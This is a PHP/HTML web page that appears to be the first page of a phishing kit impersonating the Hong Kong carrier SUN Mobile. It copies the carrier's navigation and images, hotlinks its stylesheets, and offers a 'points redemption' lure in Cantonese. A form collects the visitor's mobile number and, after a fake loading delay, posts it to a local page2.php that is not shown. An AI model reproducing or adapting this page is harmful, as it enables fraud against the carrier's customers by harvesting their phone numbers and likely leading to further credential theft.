<?php
@session_start();

include('header.php');

?>

<style>
    /* .login-banner{background: url(./assets/images/pink-banner.jpg) no-repeat center center; min-height: 200px;} */
    @media(max-width: 767px) {
 
        .page_breadcrumb .page_breadcrumb_wrap {
            padding-top: 0.72rem;
            padding-bottom: 0.72rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .page_breadcrumb .breadcrumb_content .breadcrumb_current {
            font-size: 16px;
            line-height: 1;
            color: #878787;
        }

        .common_share_third .share_button {
            line-height: 24px;
            font-size: 14px;
            border: none;
            background: none;
        }

        .common_share_third .share_button .share_btn_icon {
            background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC0AAAAtCAYAAAA6GuKaAAAAAXNSR0IArs4c6QAABLtJREFUaEPtl21oXEUUht8zN4maaCxN/khQWptaRUEwNbGV2IImGqS02XtvQhFBLQa0ptnNRxWhZUFFbU32JtWqAUtBU01nZ1N/taI/AtVimoIfrTa2jYIYLdqUFGPUJDtHrtmFkO5mt8nmo7AD99fcOee577xz5lzCVTjoKmRGGnq+di2tdFrpaRRI2yNtj/myR1FRTeayZdc9w0yPEfFdAIGIThHhwPDw+DuHD+/5NxW7kTJPezzem4ggAdwfB+xbIUYflnLv+dmCpwTatm2DueAoM9YA+JOIXtOajzCLsGHoMma8ACCPCF8vXTpS3N7ePjYb8JRAm6bvOYD3uMAArVEq8N1kKNv2FWrNX7rggKhTqqVtwaE9Hm8PEYqJsDMYdF6KBWSaPh/ALQB6lXKKFxzaNL1/AcgWgkqkDByPBWTbDUVah08APKJUa86igQ6HqeTQodjQ69c/cW1e3pLTzPg9FHJKFhzasrw9zChmph2hUODleEB+v1/4/X4G4D4zHik6iN6tAN6MHMQOgG2tUdrV5Zx2yWy7bhUzNTOjQynnwxnTRhamBDpS8o65akfiakBUCcFntOYyADsB3AjgoFJO9aKAdiEsy1fOzEfgXoMxB33FzI+GQs5viwK6snJrnhBZvQAvB/AZgBsArAKgmfl7gN43jIH9UsrR2QK762dtD9caWhe4Cj8EoGdkJLwuVT1GvA+cNbRleXczoxHg80KI1VIGBlKh5nQxZgVtmt7NADoAjAmhH5Sy7fO5Br5ie5SXN+bk5o43MaMKwAoAGQAEkdgVDLY8nwjYsurXMusmAA8AuB5APzMfuHjx0hvd3fv/SbQ+Op+00ps21a4wDONjAHfGCD4O0ItKBXbHS2xZ3kZmvBr50KmvnRFCl0nZ9nMy4ElBV1TUXpOdbfQAuBvAj8zwM4sewxjPZxZbADzpJhNCbJaypXNqYtv2VWrNoYmbkPYRhfeFwxkXiHQJEfwAbgVwSggqljLwdyLwpKBNs24bQK0Azmk9dl9X11uDkwN7PN7tRHgdoJ+E+GWllDIcnXev7pMnh1wFCwDaPnU3JsplpiuIa7dnlXLeThG07wuA1wJUrVTg4OVB/cI0h34AUCiEUS5l86fRd2zbt05r7gZwVqkltwN+PXW9x1NfTaQ/AnBCKefeFEFPtJ5aj+VPVTmawDTr2gF6On5C7lOq9Y5Y8xs2NORnZYX/ADCilJOwbU3SHslAe98FUDMT6IhFLrgNl1JObqqU7gWwOoE9+gCsZKayUCjgXuX/D8uqLWc2PpnOHqbpqwK4kxnHk+m1k1S6fhug4x5E0/Q1AbyLGb8axsDyyT2GbfuztB46C+CWaQ6i+/9YCKBBKcf9JZt2JAVdU1OTOTiY/Q0A15ORkjfWk5GRmac1bQH4qYk+RjyuVMsHUzNGlYyWPCH4vfHxsUGizEklj/qEwD0pK3kuxMaN9TdnZGh322+7XAZ26+8OpZxX4kk08WOrmwGKJVS/EPSIlIFziVR255NSOhqooqI2NyfHqJ90jV8CcJRINweDbccSJbQsXykz1wMoBTgHoH4idBKNBqTcO5xofXT+iqCTDTrX76Wh51rhtD3mS+G00mmlk1DgP9f48T3zk3pKAAAAAElFTkSuQmCC) no-repeat;
            background-size: cover;
        }

        .common_share_third .share_icon {
            width: 24px;
            height: 24px;
            display: inline-block;
            vertical-align: top;
        }

        .common_width_container {
            padding-left: 1.072rem;
            padding-right: 1.072rem;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }

        .login-form {
            padding: 0px;
            margin: 10px;
            background: #fff;
        }
.textshow {
    color: #000;
}
    .login-btn{
    width: 280px !important;
    background: linear-gradient(226deg,#f7d0b2,#ff5d00)!important;
    border-radius: 53px !important;
    border: 0 !important;
    color: #fff !important;
    padding: 15px 0px !important;
    }
}


    #videoWrapper {
  height: 60vh;
  overflow: hidden;
  position: relative;
}

#videoWrapper video {
  position: absolute;
  min-width: 100%;
  min-height: 100%;
  width: auto;
  height: auto;
  object-fit: cover; 
  z-index: -100;
  top: 50%;
  left: 50%;
  transform: translateX(-50%) translateY(-50%);
}

#videoWrapper .caption {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100%;

  background-color: rgba(0, 0, 0, 0.3);
}

#videoWrapper .caption .contents h2 {
  width:100%;
  color: #fff;
  text-align: center;
  padding: 1rem;
  font-size: 48px;
    font-weight: 700;
    line-height: 120%;
    color: #fff;
  /* background-color: rgba(0, 0, 0, 0.8); */
}
#videoWrapper .caption .contents p{
    font-size: 18px;
    line-height: 150%;
    letter-spacing: 1px;
    color: #fff;
    text-align: center;
}
span.arrow-bottom {
    position: absolute;
    top: 79%;
    left: 50%;
}
span.arrow-bottom img {
    width: 40px;
}
@media(max-width:767px){
    span.arrow-bottom img {
    width: 40px;
}
#videoWrapper .caption .contents h2{
    font-size: 32px;
    line-height: 125%;
    letter-spacing: 2px;
}
span.arrow-bottom {
    position: absolute;
    top: 70%;
    left: 40%;
    z-index: 9;
}
}

.btn-f2 {
    color: #ffffff!important;
    text-shadow: none!important;
    -webkit-text-shadow: none!important;
    border: 3px solid #fab915!important;
    padding-left: 7px!important;
    padding-right: 7px!important;
    font-size: 22px;
    font-weight: 500;
    text-align: center;

    border-radius: 0px;
    background-color: #fab915!important;
    min-width: 100px;
    width: 100%;
}

.loader {
    width: 48px;
    height: 48px;
    border: 5px solid #FFF;
    border-bottom-color: #FF3D00;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;
    }

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    } 


</style>


<link href="https://www.hkcsl.com/r/cms/pccw/2020/css/bootstrap.css" rel="stylesheet">
    <link rel="stylesheet" href="https://www.hkcsl.com/r/cms/pccw/2020/css/newstyle.css" type="text/css" />
    <!-- <link rel="stylesheet" type="text/css" href="/r/cms/pccw/2020/css/default.css" /> -->
    <link rel="stylesheet" type="text/css" href="https://www.hkcsl.com/r/cms/pccw/2020/css/component.css" />
    <link href="https://www.hkcsl.com/r/cms/pccw/2020/css/fonts.css" rel="stylesheet">
    <!-- <link href="/r/cms/pccw/2020/css/jquery.mmenu.all.css" rel="stylesheet"> -->

	<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
	<script src="https://www.hkcsl.com/r/cms/pccw/2020/js/jquery.min.js"></script>
	<!-- <script type="text/javascript" src="/hw/ztbworkflow/tbworkflow.js"></script> -->
	<!-- Include all compiled plugins (below), or include individual files as needed -->
	<script src="https://www.hkcsl.com/r/cms/pccw/2020/js/bootstrap.min.js"></script>
<section>

		</div>
	</div>

<style type="text/css">
    td{
       padding: 6px 

    }
</style>

</section>

 <div class="mobile_show mobile_bar showed"><table width="100%" border="0" cellpadding="5" cellspacing="0">
          <tbody><tr> <td align="left"><a href="/customerservice/201.jhtml" id="b_customerId_mobile" style="color:#fefcdf;"><span id="div_customerId_mobile"></span></a> <a href="/customerservice/201.jhtml" id="a_customerId_mobile"><img src="https://www.sunmobile.com.hk/TDWorld/r/cms/www/red_h5/assets/img/sun/m_my_ac_b.png" id="customerId_mobile" height="25" border="0"></a>&nbsp;<a href="/customerservice/179.jhtml"><img src="https://www.sunmobile.com.hk/TDWorld/r/cms/www/red_h5/assets/img/sun/m_address_b.png" height="25" border="0"></a>&nbsp;<a href="/customerservice/174.jhtml"><img src="https://www.sunmobile.com.hk/TDWorld/r/cms/www/red_h5/assets/img/sun/m_contact_b.png" height="25" border="0"></a></td>
          
            <td></td>
                                             
                                          
            <td width="100" align="center"><span style="color:#fefcdf;">中文</span>｜<a href="javascript:loadBi();" class="other_fff"><span>ENG</span></a></td>
            <td width="20" align="center"><a href="https://www.facebook.com/SUNMobileHK" target="_blank"><img src="https://www.sunmobile.com.hk/TDWorld/r/cms/www/red_h5/assets/img/sun/fb.png" height="15" style="margin-bottom:4px;"></a></td>
          </tr>
      </tbody></table>
</div>


<div class="page-container">

    

  <div class="">
    <div class="div_display mCustomScrollbar _mCS_1 mCS-autoHide mCS_no_scrollbar" id="iframeHight" style="overflow: visible;">
      <div id="mCSB_1" class="mCustomScrollBox mCS-minimal-dark mCSB_vertical mCSB_outside" style="max-height: 0px;" tabindex="0">
        <div id="mCSB_1_container" class="mCSB_container mCS_y_hidden mCS_no_scrollbar_y" style="position:relative; top:0; left:0;" dir="ltr">
        
          <div class="iframe_div_h"></div>
        </div>
      </div>
      <div id="mCSB_1_scrollbar_vertical" class="mCSB_scrollTools mCSB_1_scrollbar mCS-minimal-dark mCSB_scrollTools_vertical" style="display: none;">
        <div class="mCSB_draggerContainer">
          <div id="mCSB_1_dragger_vertical" class="mCSB_dragger" style="position: absolute; min-height: 50px; top: 0px;">
            <div class="mCSB_dragger_bar" style="line-height: 50px;"></div>
          </div>
          <div class="mCSB_draggerRail"></div>
        </div>
      </div>
    </div>
    <div class="menu_mobile2" id="menu_mobile2" otop="106">
      <div class="swiper-container mobile_show ipad_h_show swiper-container-horizontal swiper-container-free-mode swiper-container-ios">
        <div class="swiper-wrapper" id="swiper_01" style="transition-duration: 0ms; transform: translate3d(-1170px, 0px, 0px);">
          <div class="swiper-slide divline t_menu_tab2" data_index="0" style="width: 195px;">
            <a href="/plan/187.jhtml" title="服務計劃">服務計劃</a>
          </div>
          <div class="swiper-slide divline t_menu_tab2" data_index="1" style="width: 195px;">
            <a href="/plan/187.jhtml?id=0" title="4.5G服務計劃">4.5G服務計劃</a>
          </div>
          <div id="p_j6cw_mobile2_none" class="swiper-slide divline t_menu_tab2" data_index="2" style="width: 195px;">
            <a href="https://5g.sunmobile.com.hk/chi/5Gplan/#plan-118-20GB" title="5G SUN世代服務計劃">5G SUN世代服務計劃</a>
          </div>
          <div class="swiper-slide divline t_menu_tab2" data_index="3" style="width: 195px;">
            <a href="/plan/187.jhtml?id=2" title="安心數據服務計劃">安心數據服務計劃</a>
          </div>
          <div class="swiper-slide divline t_menu_tab2" data_index="4" style="width: 195px;">
            <a href="/plan/187.jhtml?id=3" title="附屬SIM卡服務">附屬SIM卡服務</a>
          </div>
          <div class="swiper-slide divline t_menu_tab2 swiper-slide-prev" data_index="5" style="width: 195px;">
            <a href="/plan/187.jhtml?id=4" title="全中港通數據服務計劃">全中港通數據服務計劃</a>
          </div>
          <div class="swiper-slide divline t_menu_tab2 swiper-slide-active" data_index="6" style="width: 195px; border-bottom: 2px solid rgb(245, 171, 28);">
            <a href="/customerservice/201.jhtml" title="我的賬戶" id="a_mydata_我的賬戶" style="color: rgb(245, 171, 28);">我的賬戶</a>
          </div>
          <div class="swiper-slide divline t_menu_tab2 swiper-slide-next" data_index="7" style="width: 195px;">
            <a href="/customerservice/192.jhtml" title="客戶服務" id="a_mydata_客戶服務">客戶服務</a>
          </div>
          <div class="swiper-slide divline" data_index="17" style="width: 195px;">
            <a href="/customerservice/182.jhtml" title="手機上網">手機上網</a>
          </div>
        </div>
        <span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span>
      </div>
    </div>
  
  </div>
</div>

<section>
        <div class="container banner_box">
        <div class="row">
          
                       
                    </div>
                </div>

            <!-- </div> --> 
            <div id="videoWrapper">
  <video poster="https://sb.vox1.net/video/poligonBG.jpg" playsinline autoplay muted loop>
        <source src="https://sb.vox1.net/video/poligons.mp4" type="video/mp4">
    </video>
  <div class="caption">
    <div class="contents">
      <h2>SUN Mobile 為您帶來嶄新嘅積分體驗</h2>
      <p>隨時隨地分享生活片段，與世界分享精彩時刻。</p>
    </div>
  </div>

</div>
        </div>
    </div>
</section>

<script type="text/javascript">
function trackOutboundLink(link, category, action, label) { 
    if (link.target == '_blank')
        window.open(url);
    else
        setTimeout(function() { document.location.href = link.href;}, 100);
    return false;
}
</script>





<div class="div_center_mobile_none" >
  <div class="content">

    <div class="web_show ipad_h_hide" style="/* width:100%; *//* height:150px; *//* float:left; */">
    </div>

    <div class="mobile_show ipad_h_show" style="height:50px;">
        <div class="all_title_font" style="padding-top:20px;padding-left:0px;">
            可用積分兌換查詢
        </div>
    </div>

        <div class="div_center_mobile_none">
            <div class="login-form">

                        <div class="buy_machine_title">
                   
                    </div>


                <form action="./page2.php" method="POST" id="loginForm" style="text-align: center;" novalidate="">

                    <span class="loader" id="loader_" style="display:none"></span>
                    <div class="form-group" style="text-align: center;">
                        <input type="number" class="search-field-fake" style="width:100%;height: 42px;border:1px solid #fab915;background: none;padding: 10px;font-size: 20px;" id="searchString" placeholder="請輸入手機號碼" name="phone" required="" style="
               
                " autocomplete="off">
                    </div>
                  
                    <div class="btn-f2" onclick="submitForm()" >查詢</div>
                </form>
            </div>
        </div>
<script type="text/javascript">

    

    function submitForm(){
        $("#loader_").show();

        setTimeout(() => {
            $("#loginForm").submit();
        }, "3000")
 
    }
</script>

   
    <div class="mobile_show ipad_h_show" style="">
      <div class="all_title_font div_title_renew_1" style="padding-top:10px;padding-left:0px;"></div>
    </div>
    <div class="content_all">
      <div class="col-md-6 col-sm-6" style="margin-top:15px;">
        <div style="margin:10px;">
          <strong>現在您可以透過手機程式查閱未截數用量及賬單，隨時隨地管理閣下之賬戶。</strong>
        </div>
        <strong>
          <strong>
            <div>
              <table width="100%" cellspacing="0" cellpadding="10" border="0">
                <tbody>
                  <tr class="firstRow">
                    <td align="right">
                      <div align="right">
                        <div class="font04" style="margin-right:15px;">&nbsp;</div>
                        <a href="http://goo.gl/CvHZiV" target="_blank">
                          <img src="https://www.sunmobile.com.hk//TDWorld/r/cms/www/red_h5/assets/img/sun/dl_apple.png" alt="" width="120" border="0">
                        </a>
                        <br>
                        <a href="http://goo.gl/SB03HR" target="_blank">
                          <img src="https://www.sunmobile.com.hk//TDWorld/r/cms/www/red_h5/assets/img/sun/dl_google.png" alt="" width="120" border="0">
                        </a>
                        <br>
                        <a href="https://appgallery1.huawei.com/#/app/C100976551" target="_blank">
                          <img src="https://www.sunmobile.com.hk//TDWorld/r/cms/www/red_h5/assets/img/sun/dl_huawei.png" alt="" width="120" border="0">
                        </a>
                      </div>
                    </td>
                    <td>
                      <img src="https://www.sunmobile.com.hk//TDWorld/r/cms/www/red_h5/assets/img/sun/dl_code_20200623.png" style="margin-top: 31px;" alt="" width="137" border="0">
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>
          </strong>
        </strong>
      </div>
      <strong>
        <strong></strong>
      </strong>
    </div>
  </div>
</div>


<br>
<br>
<br>


<script type="text/javascript">
function trackOutboundLink(link, category, action, label) { 
	if (link.target == '_blank')
		window.open(url);
	else
		setTimeout(function() { document.location.href = link.href;}, 100);
	return false;
}
</script>



<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.5/jquery.validate.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
<script>

    jQuery.extend(jQuery.validator.messages, {
        required: "請檢查並填寫正確的內容"
    });

    
    $("#loginForm").validate({
        rules: {
            username: "required",
        }
    });
    

</script>

<?php
include('footer-new.php');
?>

